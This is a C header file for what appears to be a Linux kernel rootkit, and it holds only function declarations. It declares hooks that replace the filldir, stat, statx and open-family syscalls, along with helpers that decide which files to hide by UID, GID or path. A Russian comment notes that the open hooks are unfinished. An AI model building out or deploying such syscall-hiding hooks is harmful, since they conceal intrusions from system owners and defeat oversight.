#ifndef FILES_H
#define FILES_H
#include <linux/fs.h>
#include <linux/delay.h>
#include <linux/sched.h>    // current
#include <linux/fdtable.h>

// ------------------------------- filldir ----------------------------------------
extern bool (*real_filldir64)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
bool ex_filldir64(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);

extern bool (*real_filldir)(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
bool ex_filldir(struct dir_context *ctx, const char *name, int namlen,
		     loff_t offset, u64 ino, unsigned int d_type);
// --------------------------------------------------------------------------------

// ------------------------------- stat -------------------------------------------
extern asmlinkage long (*real_sys_stat)(struct pt_regs *regs);
asmlinkage long ex_sys_stat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_lstat)(struct pt_regs *regs);
asmlinkage long ex_sys_lstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newstat)(struct pt_regs *regs);
asmlinkage long ex_sys_newstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newlstat)(struct pt_regs *regs);
asmlinkage long ex_sys_newlstat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_newfstatat)(struct pt_regs *regs);
asmlinkage long ex_sys_newfstatat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_statx)(struct pt_regs *regs);
asmlinkage long ex_sys_statx(struct pt_regs *regs);
// --------------------------------------------------------------------------------

// ------------------------------- open -------------------------------------------
// не до конца сделано. надо изменять название скрываемого файла
extern asmlinkage long (*real_sys_open)(struct pt_regs *regs);
asmlinkage long ex_sys_open(struct pt_regs *regs);

extern asmlinkage long (*real_sys_openat)(struct pt_regs *regs);
asmlinkage long ex_sys_openat(struct pt_regs *regs);

extern asmlinkage long (*real_sys_openat2)(struct pt_regs *regs);
asmlinkage long ex_sys_openat2(struct pt_regs *regs);
// --------------------------------------------------------------------------------


bool is_hide_uid(unsigned int file_uid);
bool is_hide_gid(unsigned int file_gid);
bool copy_filepath(char *filepath, char **kfilepath);
bool is_hide_file(unsigned int file_uid, unsigned int file_gid, char *kfilepath);

#endif

